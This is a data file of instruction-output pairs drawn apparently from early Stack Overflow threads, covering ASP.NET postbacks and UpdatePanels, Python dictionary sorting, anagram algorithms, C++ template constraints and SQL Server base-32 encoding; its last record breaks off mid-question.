{"instruction": "This is a segment of code from an app I've inherited, a user got a Yellow screen of death:\n\nObject reference not set to an instance of an object\n\non the line: \nbool l_Success ... \n\nNow I'm 95% sure the faulty argument is ref l_Monitor which is very weird considering the object is instantiated a few lines before. Anyone have a clue why it would happen? Note that I have seen the same issue pop up in other places in the code.\nIDMS.Monitor l_Monitor = new IDMS.Monitor();\nl_Monitor.LogFile.Product_ID = \"SE_WEB_APP\";\n\nif (m_PermType_RadioButtonList.SelectedIndex == -1) {\n    l_Monitor.LogFile.Log(\n        Nortel.IS.IDMS.LogFile.MessageTypes.ERROR,\n        \"No permission type selected\"\n        );\n    return;\n}\nbool l_Success = SE.UI.Utilities.GetPermissionList(\n    ref l_Monitor,\n    ref m_CPermissions_ListBox,\n    (int)this.ViewState[\"m_Account_Share_ID\"],\n    (m_PermFolders_DropDownList.Enabled)\n        ? m_PermFolders_DropDownList.SelectedItem.Value\n        : \"-1\",\n    (SE.Types.PermissionType)m_PermType_RadioButtonList.SelectedIndex,\n    (SE.Types.PermissionResource)m_PermResource_RadioButtonList.SelectedIndex);", "output": "Sprinkle in a few variables for all the property-queries on that (loooooongg) line temporarily. Run the debugger, Check values and Corner the little bug."}
{"instruction": "What are the different database options on Windows Mobile available?\nI have used CEDB and EDB for linear dataset needs.\nI have heard of SQL server 2005 Mobile edition. But what are the advantages over others (if there is any)", "output": "We use Sybase Ultralite. Before that we were using Codebase to connect to foxpro tables. I'm not a mobile developer but I understand we chose it over SQL Server for performance and memory usage. Also we found they had pretty good support when we found any issues."}
{"instruction": "This is a segment of code from an app I've inherited, a user got a Yellow screen of death:\n\nObject reference not set to an instance of an object\n\non the line: \nbool l_Success ... \n\nNow I'm 95% sure the faulty argument is ref l_Monitor which is very weird considering the object is instantiated a few lines before. Anyone have a clue why it would happen? Note that I have seen the same issue pop up in other places in the code.\nIDMS.Monitor l_Monitor = new IDMS.Monitor();\nl_Monitor.LogFile.Product_ID = \"SE_WEB_APP\";\n\nif (m_PermType_RadioButtonList.SelectedIndex == -1) {\n    l_Monitor.LogFile.Log(\n        Nortel.IS.IDMS.LogFile.MessageTypes.ERROR,\n        \"No permission type selected\"\n        );\n    return;\n}\nbool l_Success = SE.UI.Utilities.GetPermissionList(\n    ref l_Monitor,\n    ref m_CPermissions_ListBox,\n    (int)this.ViewState[\"m_Account_Share_ID\"],\n    (m_PermFolders_DropDownList.Enabled)\n        ? m_PermFolders_DropDownList.SelectedItem.Value\n        : \"-1\",\n    (SE.Types.PermissionType)m_PermType_RadioButtonList.SelectedIndex,\n    (SE.Types.PermissionResource)m_PermResource_RadioButtonList.SelectedIndex);", "output": "I'm inclined to agree with the others; it sounds like one of the parameters you are passing SE.UI.Utilities.GetPermissionList is null which is causing the exception. Your best bet is to fire up the debugger and check was the variables are before that code is called."}
{"instruction": "What are the different database options on Windows Mobile available?\nI have used CEDB and EDB for linear dataset needs.\nI have heard of SQL server 2005 Mobile edition. But what are the advantages over others (if there is any)", "output": "I think it's called SQL Server Compact now.  The advantages are that it's syntax-compatible with full sql server in that any query you write for it is guaranteed to work on an equivalent SQL Server Express/Standard/Enterprise DB.  The reverse isn't necessarily true, though."}
{"instruction": "What are the different database options on Windows Mobile available?\nI have used CEDB and EDB for linear dataset needs.\nI have heard of SQL server 2005 Mobile edition. But what are the advantages over others (if there is any)", "output": "Do you need SQL support?  If not, look at a lightweight embeddable DBM-like solution.  I've used Tokyo Cabinet for a number of embedded solutions where SQL wasn't necessary and have greatly enjoyed the speed and flexibility it provides.  YMMV."}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": "This snippet will do so.  If you're going to do it frequently, you might want to make a 'sortkeys' method or somesuch to make it easier on the eyes.\nkeys = list(d.keys())\nkeys.sort()\nfor key in keys:\n    print d[key]\n\nEdit:  dF's solution is better -- I forgot all about sorted()."}
{"instruction": "I'm pretty sure the answer to this question is no, but in case there's some PHP guru\nis it possible to write a function in a way where invalid arguments or non existent variables can be passed in and php will not error without the use of '@'\nMuch like empty and isset do. You can pass in a variable you just made up and it won't error.\nex:\n\nempty($someBogusVar); // no error\n\nmyHappyFunction($someBogusVar); // Php warning / notice", "output": "Summing up, the proper answer is no, you shouldn't (see caveat below). \nThere are workarounds already mentioned by many people in this thread, like using reference variables or isset() or empty() in conditions and suppressing notices in PHP configuration. That in addition to the obvious workaround, using @, which you don't want.\nSummarizing an interesting comment discussion with Gerry: Passing the variable by reference is indeed valid if you check for the value of the variable inside the function and handle undefined or null cases properly. Just don't use reference passing as a way of shutting PHP up (this is where my original shouldn't points to)."}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": "Do you mean that you need the values sorted by the value of the key?\nIn that case, this should do it:\nfor key in sorted(d):\n    print d[key]\n\nEDIT: changed to use sorted(d) instead of sorted(d.keys()), thanks Eli!"}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": "Or shorter,\nfor key, value in sorted(d.items()):\n    print value"}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": ">>> d = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n>>> for k,v in sorted(d.items()):\n...     print v, k\n... \nthis is a a\nthis is b b\nthis is c c"}
{"instruction": "Dictionaries unlike lists are not ordered (and do not have the 'sort' attribute). Therefore, you can not rely on getting the items in the same order when first added. \nWhat is the easiest way to loop through a dictionary containing strings as the key value and retrieving them in ascending order by key?\nFor example, you had this:\nd = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\n\nI want to print the associated values in the following sequence sorted by key:\nthis is a\nthis is b\nthis is c", "output": "d = {'b' : 'this is b', 'a': 'this is a' , 'c' : 'this is c'}\nks = d.keys()\nks.sort()\nfor k in ks:\n    print \"this is \" + k"}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "Off the top of my head, the solution that makes the most sense would be to pick a letter out of the input string randomly and filter the dictionary based on words that start with that.  Then pick another, filter on the second letter, etc.  In addition, filter out words that can't be made with the remaining text.  Then when you hit the end of a word, insert a space and start it over with the remaining letters.  You might also restrict words based on word type (e.g. you wouldn't have two verbs next to each other, you wouldn't have two articles next to each other, etc)."}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "For each word in the dictionary, sort the letters alphabetically.  So \"foobar\" becomes \"abfoor.\"\nThen when the input anagram comes in, sort its letters too, then look it up.  It's as fast as a hashtable lookup!\nFor multiple words, you could do combinations of the sorted letters, sorting as you go.  Still much faster than generating all combinations.\n(see comments for more optimizations and details)"}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "How I see it: \nyou'd want to build a table that maps unordered sets of letters to lists words i.e. go through the dictionary so you'd wind up with, say\nlettermap[set(a,e,d,f)] = { \"deaf\", \"fade\" }\n\nthen from your starting word, you find the set of letters:\n astronomers => (a,e,m,n,o,o,r,r,s,s,t)\n\nthen loop through all the partitions of that set ( this might be the most technical part, just generating all the possible partitions), and look up the words for that set of letters.\nedit: hmmm, this is pretty much what Jason Cohen posted.\nedit: furthermore, the comments on the question mention generating \"good\" anagrams, like the examples :). after you build your list of all possible anagrams, run them through WordNet and find ones that are semantically close to the original phrase :)"}
{"instruction": "I have some code that modifies a value that several controls in other update panels are bound to. When this event handler fires, I'd like it to force the other update panels to refresh as well, so they can rebind.\nIs this possible?\nEdit: \nTo clarify, I have an update panel in one user control, the other update panels are in other user controls, so they can't see each other unless I were to expose some custom properties and use findControl etc etc...\nEdit Again:\nHere is what I came up with:\npublic void Update()\n{\n    recursiveUpdate(this); \n}\n\nprivate void recursiveUpdate(Control control)\n{\n    foreach (Control c in control.Controls)\n    {\n        if (c is UpdatePanel)\n        {\n            ((UpdatePanel)c).Update();\n        }\n\n        if (c.HasControls())\n        {\n            recursiveUpdate(c);\n        }\n    }\n}\n\nI had 3 main user controls that were full of update panels, these controls were visible to the main page, so I added an Update method there that called Update on those three.\nIn my triggering control, I just cast this.Page into the currentpage and called Update.\nEdit:\nAARRGGGG!\nWhile the update panels refresh, it does not call Page_Load within the subcontrols in them...What do I do now!", "output": "You can set triggers on the events in the update panel you want updated or you can explicitly say updatepanel.update() in the code behind."}
{"instruction": "I have some code that modifies a value that several controls in other update panels are bound to. When this event handler fires, I'd like it to force the other update panels to refresh as well, so they can rebind.\nIs this possible?\nEdit: \nTo clarify, I have an update panel in one user control, the other update panels are in other user controls, so they can't see each other unless I were to expose some custom properties and use findControl etc etc...\nEdit Again:\nHere is what I came up with:\npublic void Update()\n{\n    recursiveUpdate(this); \n}\n\nprivate void recursiveUpdate(Control control)\n{\n    foreach (Control c in control.Controls)\n    {\n        if (c is UpdatePanel)\n        {\n            ((UpdatePanel)c).Update();\n        }\n\n        if (c.HasControls())\n        {\n            recursiveUpdate(c);\n        }\n    }\n}\n\nI had 3 main user controls that were full of update panels, these controls were visible to the main page, so I added an Update method there that called Update on those three.\nIn my triggering control, I just cast this.Page into the currentpage and called Update.\nEdit:\nAARRGGGG!\nWhile the update panels refresh, it does not call Page_Load within the subcontrols in them...What do I do now!", "output": "What about registering a PostBackTrigger (instead of an AsyncPostBackTrigger) that will refresh every panel when a specific event fires.  \nOr add the trigger that already refreshes some UpdatePanels to the other UpdatePanels as well."}
{"instruction": "I have some code that modifies a value that several controls in other update panels are bound to. When this event handler fires, I'd like it to force the other update panels to refresh as well, so they can rebind.\nIs this possible?\nEdit: \nTo clarify, I have an update panel in one user control, the other update panels are in other user controls, so they can't see each other unless I were to expose some custom properties and use findControl etc etc...\nEdit Again:\nHere is what I came up with:\npublic void Update()\n{\n    recursiveUpdate(this); \n}\n\nprivate void recursiveUpdate(Control control)\n{\n    foreach (Control c in control.Controls)\n    {\n        if (c is UpdatePanel)\n        {\n            ((UpdatePanel)c).Update();\n        }\n\n        if (c.HasControls())\n        {\n            recursiveUpdate(c);\n        }\n    }\n}\n\nI had 3 main user controls that were full of update panels, these controls were visible to the main page, so I added an Update method there that called Update on those three.\nIn my triggering control, I just cast this.Page into the currentpage and called Update.\nEdit:\nAARRGGGG!\nWhile the update panels refresh, it does not call Page_Load within the subcontrols in them...What do I do now!", "output": "This is a good technique if you want to refresh updatepanel from client side Javascript."}
{"instruction": "What are the different database options on Windows Mobile available?\nI have used CEDB and EDB for linear dataset needs.\nI have heard of SQL server 2005 Mobile edition. But what are the advantages over others (if there is any)", "output": "Also take a look at SQLite for Windows CE.  There are also .NET bindings available to use it from the Compact Framework."}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "As Jason suggested, prepare a dictionary making hashtable with key being word sorted alphabetically, and value word itself (you may have multiple values per key). \nRemove whitespace and sort your query before looking it up. \n\nAfter this, you'd need to do some sort of a recursive, exhaustive search. Pseudo code is very roughly:\nfunction FindWords(solutionList, wordsSoFar, sortedQuery)\n  // base case\n  if sortedQuery is empty\n     solutionList.Add(wordsSoFar)\n     return\n\n  // recursive case\n\n  // InitialStrings(\"abc\") is {\"a\",\"ab\",\"abc\"}\n  foreach initialStr in InitalStrings(sortedQuery)\n    // Remaining letters after initialStr\n    sortedQueryRec := sortedQuery.Substring(initialStr.Length)\n    words := words matching initialStr in the dictionary\n    // Note that sometimes words list will be empty\n    foreach word in words\n      // Append should return a new list, not change wordSoFar\n      wordsSoFarRec := Append(wordSoFar, word) \n      FindWords(solutionList, wordSoFarRec, sortedQueryRec)\n\nIn the end, you need to iterate through the solutionList, and print the words in each sublist with spaces between them. You might need to print all orderings for these cases (e.g. \"I am Sam\" and \"Sam I am\" are both solutions).\nOf course, I didn't test this, and it's a brute force approach."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "Is it because you are doing return confirm? seems like the return statement should prevent the rest of the code from firing. i would think an if statement would work\nif (!confirm(...)) { return false; } _doPostBack(...);\n\nCan you post all the js code in the OnClick of the link?\nEDIT: aha, forgot that link button emits code like this \n<a href=\"javascript:__doPostBack()\" onclick=\"return confirm()\" />"}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "With or without the OnClientClick event it still doesn't work.\nThe _doPostBack event is the auto generated javascript that .NET produces.\nfunction __doPostBack(eventTarget, eventArgument) {\n\n    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {\n\n        theForm.__EVENTTARGET.value = eventTarget;\n\n        theForm.__EVENTARGUMENT.value = eventArgument;\n\n        theForm.submit();\n\n    }\n\n}\n\n*The &95; are underscores, seems to be a problem with the stackoverflow code block format."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "this might seem elemental, but did you verify that your firefox settings aren't set to interfere with the postback? Sometimes I encounter similar problems due to a odd browser configuration I had from a debugging session."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "Now that i think about it, as noted in my last edit, you want to drop the javascript: in the on client click property. It's not needed, because the onclick event is javascript as it is. try that, see if that works."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "Are you handling the PageLoad event? If so, try the following\nif (!isPostBack)\n{\n    //do something\n}\nelse if (Request.Form[\"__EVENTTARGET\"].ToLower().IndexOf(\"myevent\") >= 0)\n{\n    //call appropriate function.\n}\n\nCheck if you are getting a call this way, if so then maybe the event is not wired and nedes to be explicitly called."}
{"instruction": "What would be the best strategy to generate anagrams.\n\nAn anagram is a type of word play, the result of rearranging the letters\nof a word or phrase to produce a new  word or phrase, using all the original\nletters exactly once; \nex.\n\n\nEleven plus two is anagram of Twelve plus one \nA decimal point is anagram of I'm a dot in place\nAstronomers is anagram of Moon starers\n\n\nAt first it looks straightforwardly simple, just to jumble the letters and generate all possible combinations. But what would be the efficient approach to generate only the words in dictionary.\nI came across this page, Solving anagrams in Ruby. \nBut what are your ideas?", "output": "See this assignment from the University of Washington CSE department.\nBasically, you have a data structure that just has the counts of each letter in a word (an array works for ascii, upgrade to a map if you want unicode support). You can subtract two of these letter sets; if a count is negative, you know one word can't be an anagram of another."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "what do you expect from \"Enabled = 'false'\" ?"}
{"instruction": "I have some code that modifies a value that several controls in other update panels are bound to. When this event handler fires, I'd like it to force the other update panels to refresh as well, so they can rebind.\nIs this possible?\nEdit: \nTo clarify, I have an update panel in one user control, the other update panels are in other user controls, so they can't see each other unless I were to expose some custom properties and use findControl etc etc...\nEdit Again:\nHere is what I came up with:\npublic void Update()\n{\n    recursiveUpdate(this); \n}\n\nprivate void recursiveUpdate(Control control)\n{\n    foreach (Control c in control.Controls)\n    {\n        if (c is UpdatePanel)\n        {\n            ((UpdatePanel)c).Update();\n        }\n\n        if (c.HasControls())\n        {\n            recursiveUpdate(c);\n        }\n    }\n}\n\nI had 3 main user controls that were full of update panels, these controls were visible to the main page, so I added an Update method there that called Update on those three.\nIn my triggering control, I just cast this.Page into the currentpage and called Update.\nEdit:\nAARRGGGG!\nWhile the update panels refresh, it does not call Page_Load within the subcontrols in them...What do I do now!", "output": "Page.DataBind() kicks off a round of databind on all child controls. That'll cause Asp.Net to re-evaluate bind expressions on each control. If that's insufficient, you can add whatever logic you want to make sure gets kicked off to an OnDataBinding or OnDataBound override in your usercontrols. If you need to re-execute the Page_Load event, for example, you can simply call it in your overridden OnDataBound method."}
{"instruction": "I've a class which is a wrapper class(serves as a common interface) around another class implementing the functionality required. So my code looks like this.\ntemplate<typename ImplemenationClass> class WrapperClass {\n// the code goes here\n}\n\nNow, how do I make sure that ImplementationClass can be derived from a set of classes only, similar to java's generics\n<? extends BaseClass>\n\nsyntax?", "output": "In the current state of things, there is no good way other than by comments or a third-party solution. Boost provides a concept check library for this, and I think gcc also has an implementation. Concepts are on the list of C++0x improvements, but I'm not sure if you can specify subtypes - they are more for \"must support these operations\" which is (roughly) equivalent.\nEdit: Wikipedia has this section about concepts in C++0x, which is significantly easier to read than draft proposals."}
{"instruction": "I've a class which is a wrapper class(serves as a common interface) around another class implementing the functionality required. So my code looks like this.\ntemplate<typename ImplemenationClass> class WrapperClass {\n// the code goes here\n}\n\nNow, how do I make sure that ImplementationClass can be derived from a set of classes only, similar to java's generics\n<? extends BaseClass>\n\nsyntax?", "output": "It's verbose, but you can do it like this:\n#include <boost/utility/enable_if.hpp>\n#include <boost/type_traits/is_base_of.hpp>\n\nstruct base {};\n\ntemplate <typename ImplementationClass, class Enable = void>\nclass WrapperClass;\n\ntemplate <typename ImplementationClass>\nclass WrapperClass<ImplementationClass,\n      typename boost::enable_if<\n        boost::is_base_of<base,ImplementationClass> >::type>\n{};\n\nstruct derived : base {};\nstruct not_derived {};\n\nint main() {\n    WrapperClass<derived> x;\n\n    // Compile error here:\n    WrapperClass<not_derived> y;\n}\n\nThis requires a compiler with good support for the standard (most recent compilers should be fine but old versions of Visual C++ won't be). For more information, see the Boost.Enable_If documentation.\nAs Ferruccio said, a simpler but less powerful implementation:\n#include <boost/static_assert.hpp>\n#include <boost/type_traits/is_base_of.hpp>\n\nstruct base {};\n\ntemplate <typename ImplementationClass>\nclass WrapperClass\n{\n    BOOST_STATIC_ASSERT((\n        boost::is_base_of<base, ImplementationClass>::value));\n};"}
{"instruction": "I'm working with a snippet of code that recursively calls itself and tries to pull out a MIME Type part of text/html from an email (if it exists) for further processing.\nThe \"text/html\" could exist inside other content such as multipart/alternative, so I'm trying to find out if there is a defined hierarchy for email MIME Types.\nAnybody know if there is and what it is? i.e. what types can parent other types?", "output": "Your question assumes that mail clients follow the RFC standards for MIME encoding, which they don't. I'd advise you collect a bunch of mail from sources and try and process it as-it-exists. The problem you are facing is extremely difficult (perhaps impossible) to solve 100%."}
{"instruction": "The __doPostBack is not working in firefox 3 (have not checked 2).  Everything is working great in IE 6&7 and it even works in Chrome??\nIt's a simple asp:LinkButton with an OnClick event\n<asp:LinkButton ID=\"DeleteAllPicturesLinkButton\" Enabled=\"False\" OnClientClick=\"javascript:return confirm('Are you sure you want to delete all pictures? \\n This action cannot be undone.');\" OnClick=\"DeletePictureLinkButton_Click\" CommandName=\"DeleteAll\" CssClass=\"button\" runat=\"server\">\n\nThe javascript confirm is firing so I know the javascript is working, it's specirically the __doPostBack event.  There is a lot more going on on the page, just didn't know if it's work it to post the entire page.\nI enable the control on the page load event.\nAny ideas?\n\nI hope this is the correct way to do this, but I found the answer.  I figured I'd put it up here rather then in a stackoverflow \"answer\"\nSeems it had something to do with nesting ajax toolkit UpdatePanel. When I removed the top level panel it was fixed.\nHope this helps if anyone else has the same problem.  I still don't know what specifically was causing the problem, but that was the solution for me.", "output": "I have had problems with firebug on some web forms, something to do with the network analyser can screw with postbacks."}
{"instruction": "I'm just wondering if there's a better way of doing this in SQL Server 2005.\nEffectively, I'm taking an originator_id (a number between 0 and 99) and a 'next_element' (it's really just a sequential counter between 1 and 999,999).\nWe are trying to create a 6-character 'code' from them. \nThe originator_id is multiplied up by a million, and then the counter added in, giving us a number between 0 and 99,999,999.\nThen we convert this into a 'base 32' string - a fake base 32, where we're really just using 0-9 and A-Z but with a few of the more confusing alphanums removed for clarity (I, O, S, Z).\nTo do this, we just divide the number up by powers of 32, at each stage using the result we get for each power as an index for a character from our array of selected character.\n\nThus, an originator ID of 61 and NextCodeElement of 9 gives a code of '1T5JA9'\n\n(61 * 1,000,000) + 9 = 61,000,009\n61,000,009 div (5^32 = 33,554,432) =  1 = '1'\n27,445,577 div (4^32 =  1,048,576) = 26 = 'T'\n   182,601 div (3^32 =     32,768) =  5 = '5'\n    18,761 div (2^32 =      1,024) = 18 = 'J'\n       329 div (1^32 =         32) = 10 = 'A'\n         9 div (0^32 =          1) =  9 = '9'\n\nso my code is 1T5JA9\n\nPreviously I've had this algorithm working (in Delphi) but now I really need to be able to recreate it in SQL Server 2005.  Obviously I don't quite have the same functions to hand that I have in Delphi, but this is my take on the routine. It works, and I can generate codes (or reconstruct codes back into their components) just fine.\nBut it looks a bit long-winded, and I'm not sure that the trick of selecting the result of a division into an int (ie casting it, really) is necessarily 'right' - is there a better SQLS approach to this kind of thing?\n\nCREATE procedure dummy_RP_CREATE_CODE @NextCodeElement int, @OriginatorID int,\n  @code varchar(6) output\nas\nbegin\n  declare @raw_num int;\n  declare @bcelems char(32);\n  declare @chr int;\n\n  select @bcelems='0123456789ABCDEFGHJKLMNPQRTUVWXY';\n  select @code='';\n\n  -- add in the originator_id, scaled into place\n  select @raw_num = (@OriginatorID * 1000000) + @NextCodeElement;\n\n  -- now to convert this to a 6-char code\n\n  -- 5^32\n  select @chr = @raw_num / 33554432;\n  select @raw_num = @raw_num - (@chr * 33554432);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 4^32\n  select @chr = @raw_num / 1048576;\n  select @raw_num = @raw_num - (@chr * 1048576);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 3^32\n  select @chr = @raw_num / 32768;\n  select @raw_num = @raw_num - (@chr * 32768);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 2^32\n  select @chr = @raw_num / 1024;\n  select @raw_num = @raw_num - (@chr * 1024);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 1^32\n  select @chr = @raw_num / 32;\n  select @raw_num = @raw_num - (@chr * 32);\n  select @code = @code + SUBSTRING(@bcelems, 1 + @chr, 1);\n\n  -- 0^32  \n  select @code = @code + SUBSTRING(@bcelems, 1 + @raw_num, 1);\n\n  -- that's it!\nend;\n\nI'm not desperately concerned about optimisation unless this method is actually an order of magnitude (or so) worse than any alternative. \nThe code only ever gets executed in small bursts, maybe generating 20 or 30 codes every 10 minutes or so. Because of the large range of numbers I don't want to pre-calculate the codes into a huge table (only small pockets of the overall code range will be used in any given installation).\nHowever, I'm sure there's probably a tidier way of achieving the same result - particularly those divisions and 